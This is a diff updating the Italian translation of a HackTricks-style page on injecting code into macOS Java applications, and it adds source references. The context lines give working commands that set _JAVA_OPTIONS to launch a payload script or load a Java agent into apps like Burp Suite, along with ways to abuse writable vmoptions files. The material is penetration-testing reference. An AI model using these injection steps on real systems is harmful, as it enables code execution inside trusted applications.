@@ -1,10 +1,10 @@
-# Java Applications Injection
+# Iniezione nelle applicazioni Java di macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Enumerazione
 
-Trova le applicazioni Java installate nel sistema. È stato osservato che le app Java nel **Info.plist** contengono alcuni parametri Java che includono la stringa **`java.`**, quindi puoi cercarla:
+Trova le applicazioni Java installate nel sistema. È stato osservato che le app Java nel file **Info.plist** contengono alcuni parametri Java che includono la stringa **`java.`**, quindi puoi cercarla:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,7 +14,7 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-La variabile d'ambiente **`_JAVA_OPTIONS`** può essere utilizzata per iniettare parametri Java arbitrari durante l'esecuzione di un'app compilata in Java:
+La variabile d'ambiente **`_JAVA_OPTIONS`** può essere utilizzata per iniettare parametri arbitrari nella Java VM all'avvio di un'applicazione Java.<sup>[[1]](#references)</sup>
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Tuttavia, ciò attiverà un errore nell'applicazione in esecuzione; un altro metodo più furtivo consiste nel creare un agente Java e usare:
+Tuttavia, questa tecnica genera un errore nell'applicazione eseguita. Un'alternativa più stealth consiste nel creare un Java agent e utilizzare `-javaagent`:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Creare l'agent con una **versione diversa di Java** rispetto a quella dell'applicazione può causare il crash sia dell'agent sia dell'applicazione
+> La creazione dell’agent con una **versione di Java diversa** da quella dell’applicazione può causare il crash sia dell’agent sia dell’applicazione.
 
-Dove l'agent può essere:
+Dove può trovarsi l’agent:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,7 +102,7 @@ err.printStackTrace();
 }
 }
 ```
-Per compilare l’agent, esegui:
+Per compilare l'agent, esegui:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Quindi esporta la variabile env ed esegui l'applicazione java come:
+Quindi esporta la variabile env ed esegui l'applicazione Java come segue:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## File vmoptions
+## file vmoptions
 
-Questo file supporta la specifica dei **parametri Java** quando Java viene eseguito. Potresti usare alcuni dei trucchi precedenti per modificare i parametri Java e **far eseguire al processo comandi arbitrari**.\
-Inoltre, questo file può anche **includere altri file** con la directory `include`, quindi potresti modificare anche un file incluso.
+Questo file supporta la specifica dei **parametri Java** quando Java viene eseguito. È possibile utilizzare alcune delle tecniche precedenti per modificare i parametri Java e **fare in modo che il processo esegua comandi arbitrari**.\
+Inoltre, questo file può anche **includere altri file** con la direttiva `include`, quindi è possibile modificare anche un file incluso.
 
-Inoltre, alcune app Java **caricheranno più di un** file `vmoptions`.
+Inoltre, alcune Java apps **caricheranno più di un file `vmoptions`**.
 
-Alcune applicazioni, come Android Studio, indicano nel loro **output dove stanno cercando** questi file, come:
+Alcune applicazioni, come Android Studio, indicano nel loro **output dove cercano** questi file:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Alcune applicazioni, come Android Studio, indicano nel loro **output dove stanno
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Se non lo fanno, puoi verificarlo facilmente con:
+Se non lo fanno, puoi verificarlo con:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,11 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Nota quanto sia interessante che Android Studio in questo esempio stia tentando di caricare il file **`/Applications/Android Studio.app.vmoptions`**, una posizione in cui qualsiasi utente del **`admin` group ha write access.**
+Nota che Android Studio in questo esempio tenta di caricare **`/Applications/Android Studio.app.vmoptions`**, un percorso in cui qualsiasi utente appartenente al gruppo **`admin` ha accesso in scrittura**.
 
+## References
+
+- [1] [OpenJDK — analisi di `_JAVA_OPTIONS` in `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
+- [2] [Oracle Java — specifica del package `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [3] [JetBrains — configurazione delle opzioni JVM e delle proprietà della piattaforma](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
 {{#include ../../../banners/hacktricks-training.md}}
